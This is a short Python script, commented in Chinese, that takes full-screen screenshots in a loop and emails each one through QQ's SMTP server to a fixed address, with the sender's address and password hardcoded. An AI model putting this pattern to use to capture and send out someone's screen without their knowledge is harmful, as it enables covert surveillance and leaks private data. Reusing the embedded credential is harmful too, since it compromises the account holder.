"""

"""
import yagmail
from PIL import ImageGrab
import time


username = "294813364@qq.com"#发送邮箱
password = "votqpfmsvuvjcaeg"
#设定发送的账户，方式
yag = yagmail.SMTP(user=username, password=password, host='smtp.qq.com')
#循环，也可以用while True来代替。
for i in range(5):
    im = ImageGrab.grab()  # 无参数默认全屏截屏
    im.save('shot.jpg')  # 截图保存，默认是当前目录
    address = "1061369886@qq.com"#发送到xxx邮箱
    # 标题
    title = [
        "测试邮件" + str(i+1)
    ]
    # 内容
    content = [
        "屏幕现况"
        , yagmail.inline("shot.jpg")  # 插入图片并显示到正文
    ]
    # 4、发送邮件
    yag.send(to=address, subject=title, contents=content)
    # 5、关闭连接
    yag.close()
    print("email has been send to" , address)
    time.sleep(10)#根据需求设定时间

